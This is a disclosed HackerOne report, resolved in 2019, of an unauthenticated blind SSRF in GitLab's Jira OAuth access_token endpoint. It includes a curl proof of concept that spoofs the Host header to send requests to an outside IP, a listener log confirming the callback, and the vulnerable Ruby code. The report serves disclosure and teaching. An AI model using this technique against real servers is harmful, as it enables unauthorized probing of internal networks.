# [H] Unauthenticated blind SSRF in OAuth Jira authorization controller

## Summary
Severity: High (CVSS 7.5)
Program: GitLab
Weakness: Server-Side Request Forgery (SSRF)
Reporter: jobert
State: resolved
Disclosed: 2019-03-14T16:28:39.097Z
Source: https://hackerone.com/reports/398799

## Details
The `Oauth::Jira::AuthorizationsController#access_token` endpoint is vulnerable to a blind SSRF vulnerability. The vulnerability allows an attacker to make arbitrary HTTP/HTTPS requests inside a GitLab instance's network.

# Proof of concept
To reproduce the vulnerability, follow the steps below.

 - spin up a GitLab EE instance with the latest version (11.2.1-ee)
 - send a `POST` request to the `/-/jira/login/oauth/callback` endpoint, as shown below. In the request, point the `Host` header to the hostname / IP address and port number you want to send the request to:

```
curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'
```

 - Observe a `POST` request being sent to `162.243.147.21:81` (in this case HTTPS):

```
Listening on [0.0.0.0] (family 0, port 81)
Connection from [35.231.137.154] port 81 [tcp/*] accepted (family 2, sport 58558)
��ؒ����
��/$����4�i�,�֟J%>�+�/�,�0�����#�'�	��$�(�
�gk39@j28��<=/5�l162.243.147.21

 Connection closed, listening again.
```

# Vulnerable code
The following code can be found in the `Oauth::Jira::AuthorizationsController#access_token` method.

```ruby
def access_token
  auth_params = params
                  .slice(:code, :client_id, :client_secret)
                  .merge(grant_type: 'authorization_code', redirect_uri: oauth_jira_callback_url)

  auth_response = Gitlab::HTTP.post(oauth_token_url, body: auth_params, allow_local_requests: true)
  token_type, scope, token = auth_response['token_type'], auth_response['scope'], auth_response['access_token']

  render text: "access_token=#{token}&scope=#{scope}&token_type=#{token_type}"
end
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/398799_
